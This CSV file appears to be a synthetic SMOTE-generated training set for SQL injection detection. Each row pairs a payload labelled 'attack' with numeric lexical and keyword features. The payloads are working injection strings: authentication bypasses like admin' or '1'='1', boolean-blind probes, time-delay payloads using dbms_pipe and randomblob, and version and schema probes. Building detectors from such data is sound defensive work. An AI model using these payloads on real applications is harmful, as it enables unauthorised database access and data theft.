id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000092,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000043,1.1296061762706442,21.35213065563574,11.901420437090493,3.07501168292062,6.084517030908746,2.0,6.183096593818252,7.084517030908744,0.2747794320541955,0.09719173505816309,0.3046535333043644,0.32337529958327704,4.084517030908745,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,3.0,0.816903406181749,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000093,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""yzjl"" like ""yzjl",nearest_attack_euclidean,R000139,0.6162645753951325,127.94555394269528,30.05241811090533,3.9151968420755097,53.0,14.0,44.366926776337294,16.578627166357993,0.41608289922374875,0.10990869036099021,0.3446415466203913,0.12936686379486972,0.0,2.9999999999999996,0.0,0.0,0.0,0.0,0.0,9.578627166357993,1.3877787807814457e-17,1.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000094,attack,boolean,1 and 8398  =  1891-- naov,nearest_attack_euclidean,R000238,0.6391367562948913,25.01489279135655,12.492553604321724,3.3230150899498963,6.014892791356555,9.0,6.75372319783914,3.2462768021608612,0.23650867663596944,0.3616537847513829,0.27009187693063236,0.1317456616820153,0.24627680216086156,0.0,2.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,3.0,0.24627680216086156,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000095,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'rfgj' like 'rfgj",nearest_attack_euclidean,R000200,0.4582952396882425,120.11445212714099,30.0,3.9788253495437984,52.62851595761967,13.504687943492893,38.733592197774875,15.247656028253555,0.438598177272733,0.1127531207652101,0.32176094687703477,0.1268877550850222,3.247656028253554,0.0,0.0,0.12382801412677695,0.0,0.0,0.0,8.247656028253553,1.3877787807814457e-17,0.8761719858732231,2.752343971746446,0.12382801412677669,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.12382801412677688,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.8761719858732231,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000096,attack,boolean,-5580 or 4829  =  1968,nearest_attack_euclidean,R000123,0.0,22.0,13.0,3.356492413796824,2.0,12.0,6.0,2.0,0.09090909090909088,0.5454545454545454,0.2727272727272727,0.09090909090909091,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000097,attack,boolean,"-7559"" or 8792  =  6905--",nearest_attack_euclidean,R000099,0.6267090943731358,24.74705947425884,12.494118948517691,3.323508639976363,2.0,12.0,6.0,4.747059474258845,0.08084313508580387,0.4850588105148231,0.24252940525741154,0.1915686491419615,0.0,0.7470594742588451,3.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,4.0,0.0,0.7470594742588451,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000098,attack,boolean,or 1 --',nearest_attack_euclidean,R000005,1.7509448756842352,11.531772593792603,6.4414715742240745,2.5107707896414837,2.0,1.4414715742240745,3.324414722672227,4.7658862968963005,0.1948160532219906,0.125,0.2775919733890047,0.40259197338900465,2.3244147226722256,0.0,2.0,0.0,0.0,0.4414715742240751,0.0,0.0,1.3877787807814457e-17,0.0,0.0,2.4414715742240753,1.0,0.0,1.0,0.0,0.0,0.4414715742240751,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000099,attack,boolean,1' and 2908  =  8067--,nearest_attack_euclidean,R000261,1.4110978671024108,22.0,14.443896367064157,3.5220687881737236,3.0,9.0,6.0,4.0,0.13636363636363635,0.4090909090909091,0.2727272727272727,0.18181818181818182,0.5561036329358431,0.4438963670641569,2.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,3.0,0.5561036329358431,0.4438963670641569,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000100,attack,boolean,-6764'  )   or 2314  =  2017--,nearest_attack_euclidean,R000272,0.10200635939301146,30.0,14.85946127268161,3.298382398752723,2.0,12.0,10.0,6.0,0.06666666666666665,0.4,0.3333333333333333,0.2,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,1.3877787807814457e-17,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000101,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R000253,1.2455420330034515,39.8805591281511,16.94027956407555,3.2660741694630704,3.9402795640755492,13.94027956407555,15.514930108981114,6.485069891018887,0.09475312250657675,0.3480324209399663,0.3942225617884485,0.16299189476500842,0.0,0.0,3.0,0.0,0.4850698910188872,1.0,0.0,2.0,1.3877787807814457e-17,0.0,0.0,4.485069891018887,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000102,attack,boolean,"1'+  (  select sshu where 3442  =  3442 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",nearest_attack_euclidean,R000168,1.1287940905242069,291.70637473376127,35.26474105241152,3.841603557890724,66.11792841929216,79.0,111.52948210482305,35.058964209646085,0.22650794933999516,0.27093906820310043,0.3824397908703727,0.12011319158653178,2.5294821048230385,0.0,0.0,0.0,1.9999999999999998,2.0,0.0,20.0,1.3877787807814457e-17,0.0,6.0,6.529482104823039,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.26474105241151935,5.0,0.0,1.0,1.2647410524115195,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.26474105241152
SMOTE_000103,attack,boolean,"admin"" or ""1""  =  ""1""--",nearest_attack_euclidean,R000002,1.4669133428855066,23.574885891417253,12.287442945708626,3.22870360199843,5.562785271456875,4.874429457086254,6.0,7.137671162874124,0.23986062609319536,0.19993409692199884,0.25487075591564606,0.3053345210691597,0.0,3.850228217165499,2.2874429457086256,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,3.2874429457086256,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000104,attack,boolean,"1' in boolean mode  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R000197,0.3899028282738749,116.92513307184765,29.929836913136434,3.7292341412630714,42.17866095281424,14.4162746798926,45.497648079355606,14.832549359785201,0.3620384058797401,0.12917282645883055,0.3839760932188412,0.12481267444258817,2.8054248932975336,0.0,0.0,0.9027124466487668,0.0,1.0,0.0,8.221699573190135,1.3877787807814457e-17,0.0,0.9027124466487668,1.9027124466487668,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000105,attack,boolean,or 'a'  =  'a,nearest_attack_euclidean,R000020,0.9547584189757761,17.347533999292935,7.115844666430977,2.4337049665386554,6.603637555005616,-1.7763568394002505e-15,6.371948222143661,4.37194822214366,0.3573316452574748,0.0,0.38236668047904854,0.26030167426347667,3.3719482221436596,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000106,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'cpoy'  =  'cpoy",nearest_attack_euclidean,R000281,5.946971482833433,266.0108929204489,33.91453709598108,3.730240529988697,76.38039394586282,34.104734068912485,109.4210308367611,46.104734068912485,0.2959893544017361,0.12111663177969095,0.40620887067602107,0.17668514314255176,4.0,0.0,0.0,0.0,0.0,2.489317136997635,0.0,21.786342739952694,1.3877787807814457e-17,2.489317136997635,0.5106828630023652,16.31839132895979,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.9786342739952696,0.0,0.4893171369976348,0.4893171369976349,1.5106828630023652,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4893171369976348,0.4893171369976348,4.446585684988174
SMOTE_000107,attack,boolean,-9950' or 4425  =  1975,nearest_attack_euclidean,R000076,0.04635591404317072,23.0,12.800461095334873,3.331447703101181,2.0,12.0,6.0,3.0,0.08695652173913043,0.5217391304347826,0.2608695652173913,0.13043478260869565,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000108,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu",nearest_attack_euclidean,R000215,0.3092105819793937,127.7532939037776,29.22078199433986,4.284449462244329,84.0,4.0,26.09094792075802,13.662345983019575,0.6593870574286596,0.031399383687079035,0.2024680726599811,0.10674548622428041,3.0,0.0,0.0,0.0,1.0,0.0,0.0,2.6623459830195753,1.3877787807814457e-17,0.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000109,attack,boolean,"-7764"" or 7308  =  7805",nearest_attack_euclidean,R000112,0.008228024062775266,23.0,12.938166579730577,3.3257419434342794,2.0,12.0,6.0,3.0,0.08695652173913043,0.5217391304347826,0.2608695652173913,0.13043478260869565,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000110,attack,boolean,1' and 7528  =  2894 and 'qoyw'  =  'qoyw,nearest_attack_euclidean,R000091,0.40076835663555554,44.326088750384,18.012287880551654,3.6607608593047396,15.012287880551655,9.578450217458089,13.156900434916178,6.578450217458089,0.33953451242272936,0.217142400976496,0.29554872440051644,0.14777436220025822,4.0,0.0,0.0,0.0,0.0,2.0,0.0,0.2892251087290445,1.3877787807814457e-17,0.14461255436452214,0.14461255436452214,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.14461255436452214,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000111,attack,boolean,"1 and elt  (  3172  =  7243,7243  )  ",nearest_attack_euclidean,R000285,0.05214490940443495,37.023994652354496,16.0239946523545,3.276241838377061,6.0,13.0,14.0,4.023994652354498,0.1620597667751586,0.3511294946795104,0.37813945580870345,0.10867128273662763,0.023994652354498047,0.0,0.0,0.0,0.0,1.0,0.0,2.0,1.3877787807814457e-17,0.0,1.0,1.0,0.023994652354498103,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000112,attack,boolean,-8465' where 5242  =  5242 or 3806  =  7423--,nearest_attack_euclidean,R000082,0.37401051255233275,44.82645287658677,17.0,3.625267773840702,7.0,20.0,12.0,5.826452876586769,0.15616910599186495,0.4461974456910427,0.2677184674146256,0.12991498090246667,0.8264528765867696,0.0,3.0,0.0,0.0,2.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,5.0,0.8264528765867696,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000113,attack,boolean,"-8875""  )   where 8428  =  8428 or 1519  =  5756--",nearest_attack_euclidean,R000240,0.9296293464334248,60.87890441323965,19.89198337621559,3.573973654891431,9.837975064323388,21.89198337621559,20.72995844053898,8.418987532161694,0.15801271844479228,0.3663071453550648,0.33710560312742865,0.13857453307271428,0.0,1.0,3.0,0.0,0.47299584405389783,2.0,0.0,1.9459916881077957,1.3877787807814457e-17,0.0,0.0,5.472995844053898,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000114,attack,boolean,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'hqqj'  =  'hqqj",nearest_attack_euclidean,R000235,0.9673980204954353,303.63875299961666,39.63583266675185,4.030526387597318,118.0,34.0,110.27458566636852,41.364167333248155,0.3886696103793066,0.11198954875335954,0.36312366425635184,0.13621717661098207,3.271665333503701,0.728334666496299,0.0,0.0,0.0,2.0,0.0,22.36416733324815,1.3877787807814457e-17,3.0,3.0,8.0,0.8179163333759252,0.18208366662407466,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,11.0
SMOTE_000115,attack,boolean,"1 and elt  (  3172  =  7243,7243  )  ",nearest_attack_euclidean,R000285,0.7376854825051277,32.1459494147684,14.651652615213443,3.2215045916524523,5.190991569128066,11.921322092170755,11.84264418434151,3.190991569128066,0.16101136780814804,0.3843407894997565,0.3615000611861711,0.0931477815059244,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.4606610460853768,1.3877787807814457e-17,0.0,0.7303305230426885,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.7303305230426886,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000116,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'cpoy'  =  'cpoy",nearest_attack_euclidean,R000281,1.7494567936483052,148.2857925025491,32.06344860969495,3.849169916231541,48.82537944387798,15.58731027806101,57.11117194642708,26.761930834183033,0.3297635091712871,0.10511126620465991,0.3847879364052249,0.18033728821882802,2.761930834183029,0.0,0.8253794438779807,0.0,0.0,1.5873102780610095,0.0,11.58731027806101,1.3877787807814457e-17,2.0,1.0,8.41268972193899,1.0,0.0,0.4126897219389904,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.5873102780610095,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5873102780610098
SMOTE_000117,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",nearest_attack_euclidean,R000116,0.07905386286448746,136.85918913303703,34.023468477827166,4.285351118298471,63.90612608869135,15.035202716740743,38.94132880543209,18.976531522172838,0.4669285354532172,0.10989401081447747,0.2845228420528907,0.13865461167941462,4.0,3.9530630443456753,0.0352027167407436,0.0,0.0,1.988265761086419,0.0,4.0,1.3877787807814457e-17,0.0,0.0,6.023468477827162,1.0,0.9882657610864187,0.011734238913581163,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0000000000000002,1.9765315221728377,0.011734238913581163,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.988265761086419
SMOTE_000118,attack,boolean,or 3  =  3 --,nearest_attack_euclidean,R000312,0.5820467676758788,12.614823302067286,6.0,2.2322241838925,2.7703533958654205,1.2296466041345795,5.61482330206729,3.0,0.22298043296228126,0.09458820031804463,0.44425489175942967,0.2381764749602444,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000119,attack,boolean,"-7146"" where 6431  =  6431 or 8548  =  5549--",nearest_attack_euclidean,R000219,0.9756384459302813,44.58985428904346,17.0,3.6360145467983824,7.0,20.0,12.0,5.589854289043454,0.1570055656447959,0.44858733041370247,0.26915239824822146,0.12525470569328015,0.0,0.5898542890434539,3.0,0.0,0.0,2.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,5.0,0.0,0.5898542890434539,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000120,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000080,0.47273963791017864,142.88778440285463,30.0,3.883986589373726,48.0,16.0,52.7102275222837,26.177556880570926,0.33605385232871465,0.11201795077623825,0.3687308895114828,0.18319730738356427,0.35511376114185067,3.644886238858149,0.0,0.0,0.0,2.0,0.0,10.177556880570926,1.3877787807814457e-17,2.0,1.0,8.0,0.08877844028546289,0.9112215597145372,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000121,attack,boolean, or 1 in   (  select @@version  )  --,nearest_attack_euclidean,R000012,1.9374477669605281,33.73809041832313,14.776783906871174,3.3107742945789753,10.883919534355874,5.4851256748056905,11.776783906871175,5.5922613022903915,0.3002399679959684,0.1847265233452819,0.348691359847188,0.1663421488115617,0.0,0.0,2.4077386977096085,0.0,0.0,0.40773869770960836,0.0,1.5922613022903915,1.3877787807814457e-17,0.0,0.0,2.8154773954192165,0.0,0.0,1.0,0.0,0.0,0.40773869770960836,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.5922613022903916,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5922613022903918
